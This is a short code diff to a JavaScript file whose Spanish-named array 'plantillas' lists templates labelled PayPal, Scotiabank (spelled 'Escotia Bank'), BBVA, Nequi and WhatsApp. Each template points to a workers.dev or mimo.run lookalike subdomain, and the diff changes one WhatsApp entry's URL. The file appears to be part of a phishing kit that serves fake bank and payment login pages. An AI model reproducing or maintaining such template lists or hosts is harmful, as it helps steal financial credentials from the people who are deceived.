@@ -295,7 +295,7 @@ const plantillas = [
   { nombre: "PayPal Estandar", url: "https://paypal-estandar.glegogle5341-af7.workers.dev/" },
   { nombre: "PayPal Basico", url: "https://paypal-basico.glegogle5341-af7.workers.dev/" },
   { nombre: "Escotia Bank", url: "https://scotiabank.glegogle5341-af7.workers.dev/" },
-  { nombre: "whatsapp Normal", url: "https://whatsapp-grupo.glegogle5341-af7.workers.dev/" },
+  { nombre: "whatsapp Normal", url: "https://6rnvkl.mimo.run/index.html" },
   { nombre: "whatsapp XxX Avance", url: "https://whatsappxxx.glegogle5341-af7.workers.dev/" },
   { nombre: "Nequi Login Encuesta", url: "https://nequi-login.glegogle5341-af7.workers.dev/" },
   { nombre: "BBVA", url: "https://2gb4lr.mimo.run/index.html" },
@@ -1155,5 +1155,6 @@ document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatM
     actualizarUsuarios();
   }, 2000);
 })();
+
 
 
